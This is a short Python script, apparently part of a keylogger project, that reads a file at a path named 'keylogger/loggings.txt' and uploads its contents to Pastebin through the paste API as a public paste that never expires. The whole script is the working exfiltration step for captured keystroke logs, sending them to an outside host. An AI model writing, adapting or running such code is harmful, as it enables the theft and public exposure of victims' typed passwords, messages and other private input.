import requests

def upload(API_KEY,PATH):

    try:
        with open(PATH, 'r') as file:
            content = file.read()

    
        url = "https://pastebin.com/api/api_post.php"

        data = {

            "api_dev_key": API_KEY,
            "api_option": "paste",
            "api_paste_code": content,
            "api_paste_private": "0",  # 0=public, 1=unlisted, 2=private
            "api_paste_name": "loggings.txt",
            "api_paste_expire_date": "N"  # Never expire

        }

        response = requests.post(url, data=data)

        if response.status_code == 200:
            print("successful")
            print("URL: ",response.text)
        else:
            print("Unsuccessful")

    except Exception as e:
        print(f"An error occurred: {e}")





if __name__ == "__main__":
    API_KEY = "enter_you_api_key"

    PATH = "/home/man44/Documents/keylogger/loggings.txt"

    upload(API_KEY,PATH)
